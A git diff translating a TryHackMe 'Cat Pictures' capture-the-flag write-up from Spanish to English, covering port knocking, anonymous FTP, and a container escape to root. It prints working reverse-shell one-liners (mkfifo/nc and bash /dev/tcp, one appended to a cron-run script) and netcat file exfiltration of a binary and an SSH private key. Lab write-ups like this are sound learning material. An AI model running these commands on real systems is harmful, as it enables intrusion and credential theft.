@@ -1,72 +1,94 @@
-# Máquina Cat Pictures THM
-## Ennumeración
+# Cat Pictures THM
 
-Primero de todo vemos la conectividad haciendo un ping a la maquina victima 
+### Enumeration
+
+First I checked the connection with a ping to the machine
 
 ![Ping](Writeups/THM/Cat_Pictures/Img/Ping.png)
 
-Como podemos ver con el ttl nos enfrentamos a una máquina linux
-Ahora vamos a hacer el escaneo de puertos y servicios con nmap.
+Based on the ttl we know is a linux machine, nos I scan the ports and services of the machine with nmap.
+
 ```bash
 nmap <IP> -p- --open -sS --min-rate 5000 -Pn -n -vvv -oG allports
 ```
+
 ![nmap-allports](Img/Nmap-allports.png)
+
 ```bash
 nmap <IP> -p22,4420,8080 -sCV -oN targeted
 ```
 
 ![nmap-targeted](Img/Nmap-targeted.png)
 
+The results of nmap are:
+- 22 <- ssh - I don't have any credentials.
+- 4420 <- nvm-express - Searching information about the service i found that is a NVMe storage service that is accessible on the network
+- 8080 <- Web page
+### NVM-express scan
 
-Vale una vez el escaneo hecho podemos ver tres puertos:
-- 22 <- ssh - no tenemos credenciales a si que de momento lo descartamos
-- 4420 <- nvm-express - buscando información al respecto veo que es un servicio de almacenamiento NVMe accesible por red
-- 8080 <- Parece una pagina web normal la cual ahora veremos
-### Escaneo nvm-express
+First I'm going to check if i can access to the NVMe service because it can have access to sensitive data, unfortunately the service ask me for credentials
 
-Lo primero que voy a hacer va a ser ver si me puedo conectar sin credenciales al servicio de NVMe porque si es así podría encontrar información crítica, para eso nos conectamos con netcat pero al hacerlo nos pide password el cual no tenemos a si que vamos a descartar también este servicio de momento
-### Escaneo web
+### Web scan
 
-Ahora vamos a entrar a la pagina web por el puerto 8080 que se vería algo así 
+I had access to the web page in the 8080 port and looks like this:
+
 ![web](Img/web.png)
-Navegando un poco por la web nos encontramos este post
+
+Browsing in the web page I found this blog:
+
 ![post](Img/post.png)
 
-### Explotación Port Knocking
+### Port Knocking exploitation
 
-Aqui vemos este mensaje donde knock knock hace referencia a una tecnica que se llama port knocking que si haces una secuencia de 'golpes' puedes descubrir un puerto ocultado por un firewall y invisible para escaneres como nmap. Buscando he encontrado un script en python en este [repositorio](https://github.com/eliemoutran/KnockIt) de github y lo ejecutamos de esta forma.
+In this post knock knock makes reference to port knocking, port knocking is a technique that if you make a connection to some ports, you can discover a port that has been hidden with a firewall.
+
+Searching for information I found a python script in this [repository](https://github.com/eliemoutran/KnockIt) and i executed it like this:
+
 ```bash
 python3 knockit.py -b 10.66.164.145 1111 2222 3333 4444
 ```
-Después de esto vamos ha hacer otro escaneo de nmap el cual nos ha revelado un servicio de ftp con acceso anónimo
-![ftp-scan](Img/ftp-scan.png)
-### Escaneo de FTP
 
-Nos metemos al ftp de forma anonima y vemos que hay un archivo: note.txt el cual me voy a descargar en mi maquina atacante
-### Conectividad con NVMe
-La nota contiene la credencial para conectarnos al servicio de nvme asi que vamos a conectarnos con netcat
-![NVME-connect](Img/NVMe-connect.png)
-Ya estamos dentro, viendo que la maquina tiene mkfifo y ncat me hago una reverse shell.
+After I executed the exploit I have done another nmap scan, that scan reveled me that there is a FTP service running.
+
+![ftp-scan](Img/ftp-scan.png)
+### FTP enumeration
+
+I entered to the FTP service with a anonymous session and I saw a file named note.txt and I downloaded to my machine.
+### NVMe enumeration
+
+The note contains a credential for the NVMe service so i can connect with netcat.
+
+```bash
+nc -nv <IP> 4420
+```
+
+I'm inside the machine, I saw that the machine have mkfifo and netcat so I made a reverse shell.
+
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.145.222 1234 >/tmp/f
 ```
-Ahora que ya estamos fuera de la shell limitada ya nos podemos mover por directorios y ejecutar el script 'runme'
+
+Now I'm not in a limited shell, I can move through the directories and  I can execute the runme script.
 
 El script runme pide contraseña asi que se me ha ocurrido ver los strings del archivo, para eso hay que mandarnoslo con netcat de la siguiente manera
+The runme script ask me for password so I through to see the strings of the file, to do that I have to move the file to my machine, for do that I used netcat
+
 ```bash
 # nuestra maquina
-nc -lvnp 4444 > runme
+nc -lvnp <PORT> > runme
 # maquina victima
-nc <IP> 4444 < /home/catlover/runme
+nc <IP> <PORT> < /home/catlover/runme
 ```
-Viendo los strings de el archivo vemos una palabra en texto claro lo cual parece una contraseña
+
+In the strings I have found a plain text word that seems a password.
+
 ![passwd](Img/passwd.png)
 
-Ejecutamos el script con esa contraseña y se nos transfiere un id_rsa
+Using the obtained credential I can execute the script and the script created a private ssh key.
 
 ![script](Img/script.png)
 
-Nos transferimos con netcat igual que antes el id_rsa a nuestro equipo.
+I send with netcat the private key to my machine.
 
 ```bash
 # nuestra maquina
@@ -77,7 +99,7 @@ nc <IP> 4444 < /home/catlover/id_rsa
 
 ### SSH
 
-Por ultimo nos conectamos a la maquina victima por ssh con esta clave privada, no sin antes darle los permisos correctos.
+With the obtained key I can connect to the machine with SSH but before I have to give the right permissions 
 
 ```bash
 chmod 600 id_rsa
@@ -86,8 +108,8 @@ chmod 600 id_rsa
 ssh -i id_rsa root@<IP>
 ```
 
-Aqui podemos ver la primera flag, pero y la otra? viendo un poco la maquina me he dado cuenta de que estoy en un contenedor y tenemos que salir, para eso he revisado y hay un script llamado clean.sh situado en /opt/clean el cual parece que se ejecuta automaticamente y tengo permiso de escritura, le voy a poner una reverse shell y me voy a poner en escucha con penelope (un handler que hace la misma funcion que netcat pero te automatiza el tratamiento de la shell)
-### Salida del contenedor
+Here I can see the first flag, but where's the other? Looking around the machine I saw that I'm in a container, for exit the container I saw a script named clean.sh in the /opt/clean directory, this script seems to be executed repetitively so I put a reverse shell inside it.
+### Exit the container
 
 ```bash
 echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> clean.sh
@@ -95,8 +117,11 @@ echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> clean.sh
 
 ![root](Img/root.png)
 
-De esta manera ya somos root y ya podemos leer la flag.
-### Aprendido
+I waited some seconds and I become root user, this way I can read the flag.
 
-En esta máquina he aprendido conceptos nuevos como el port knocking y he repasado conceptos como reverse shell, claves, strings y contenedores.
+### Lessons learned
+
+- I learned what is port knocking and how to explote it.
+- Anonymous FTP login can make serious sensitive data leak.
+- Script that are repetitively executed can be dangerous with bad permissions and can be a way to fully root compromise a system.
 
